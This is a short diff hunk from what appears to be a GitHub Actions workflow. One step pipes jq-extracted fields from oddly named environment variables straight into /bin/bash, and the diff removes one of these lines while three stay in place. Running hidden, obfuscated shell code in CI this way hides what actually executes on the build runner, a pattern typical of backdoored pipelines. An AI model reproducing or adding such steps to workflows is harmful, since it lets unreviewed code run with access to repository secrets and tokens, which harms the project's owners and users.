@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$evl426" | jq -r .bp41 | /bin/bash
           printf '%s' "$r53188" | jq -r .qf4 | /bin/bash
           echo $epzru6530 | jq -r .wfmdf38 | /bin/bash
-          printf '%s' "$eg5" | jq -r .byfb115 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
